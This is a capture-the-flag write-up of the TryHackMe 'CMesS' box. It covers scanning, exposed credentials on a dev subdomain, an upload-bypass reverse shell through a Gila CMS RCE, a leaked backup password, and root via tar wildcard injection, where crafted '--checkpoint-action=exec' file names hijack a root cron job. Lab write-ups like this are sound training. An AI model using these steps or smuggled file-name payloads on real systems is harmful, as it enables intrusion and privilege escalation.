---
layout: post
title: "TryHackMe: CMesS"
categories: TryHackMe
published: true
---

Hello H4x0rs! Are you crazy enough to root this box? Of course I do! Let's penetrate Gila CMS.

![banner](/assets/pictures/tryhackme/gilacms.png)


## Reconnaissance

`nmap  -sC  -p-  -sV  $IP  -oN  nmap.txt  --vv`

1. -sC: This is the switch for scanning common vuln using common script
2. -p-: This is the switch to scan all possible opened ports of 65535
3. -sV: This is the switch for scanning the running services 
4. -oN: This is the switch to output the result in TXT format.
5. --vv: Advance verbose

Nmap result:
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9b652d3939a3850b4233bfd210c051f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21c36e318b85228a6d72868fae64662b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5bb9757805d7ec43309617ffc6a86ced (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Only 2 services are running, let's take a look at port 80 and examine that particular CMS.

## Enumeration
![webpage](/assets/pictures/tryhackme/cmess-webpage.png)

It's only a simple Gila CMS webpage; there's nothing interesting here. Gobuster results also show nothing in particular. Thus, I decided to find any active subdomain.

```bash
/index                (Status: 200) [Size: 3851]
/about                (Status: 200) [Size: 3353]
/search               (Status: 200) [Size: 3851]
/blog                 (Status: 200) [Size: 3851]
/login                (Status: 200) [Size: 1580]
/1                    (Status: 200) [Size: 4078]
/01                   (Status: 200) [Size: 4078]
/category             (Status: 200) [Size: 3862]
/0                    (Status: 200) [Size: 3851]
/feed                 (Status: 200) [Size: 735]
/themes               (Status: 301) [Size: 318] [--> http://cmess.thm/themes/?url=themes]
/admin                (Status: 200) [Size: 1580]
```
---
`gobuster dns -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d cmess.thm`
> Found: dev.cmess.thm

I found admin password on this page!

![dev.cms](/assets/pictures/tryhackme/dev.cms.png)

---
## Gaining access
Grab that exposed credential and log in as andre. The version of this GILA CMS is `1.10.9`. I searched this version to look for any public exploits and found Authenticated Remote Code Execution (RCE) in the Exploit database.

[Exploit DB - Gila CMS RCE](https://www.exploit-db.com/exploits/51569)

Upon running this exploit, a reverse shell can be uploaded without issue but the reverse connection is failed. So I decided to upload my own reverse shell using the same method by bypassing file upload restriction.

![upload](/assets/pictures/tryhackme/cmess3.png)

and ..... we got a shell!

```bash
└─# nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.9.58.250] from (UNKNOWN) [10.10.95.52] 36668
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 22:34:47 up 55 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id; whoami
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

## User's flag

I found a juicy information in `/opt/.password.bak`

```
$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```
ssh into andre and grab a user flag!

![user-flag](/assets/pictures/tryhackme/cmess-userflag.png)

---
## Privilege Escalation

> cat /etc/crontab

Root is running a cronjob to backup andre directory. Let's take a look at this scenario.
> */2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

```
andre@cmess:~/backup$ cat note 
Note to self.
Anything in here will be backed up!
```

Every 2 min, file and folder that is stored here (`/backup/`) will be backed up and compressed into a tarball in the /tmp directory, as there is a wildcard (*) in the `-zcf /tmp/andre_backup.tar.gz *` command. We can take advantage of this functionality by adding malicious commands to the first checkpoint.

[Source:GtfoBins](https://gtfobins.github.io/gtfobins/tar/)

---
> **Create a bash script in /backup directory**
>>`echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > exploit.sh`
>>>It will copy bash binary into /tmp directory and give it setuid and setgid permission.

> **Create a tar utility checkpoint**
>>`touch /home/andre/backup/--checkpoint=1`
>>>It is for displaying a progress message after one record.

> **Create another utility checkpoint** 
>>`touch /home/andre/backup/--checkpoint-action=exec=sh\ exploit.sh`
>>>After every checkpoint, it will run the specified action. In this case, tar will run exploit.sh.

---
Now let's wait for 2 minutes and gain a root shell!

> `/tmp/bash -p`

![root](/assets/pictures/tryhackme/cmess-root.png)

---

# ROOTED!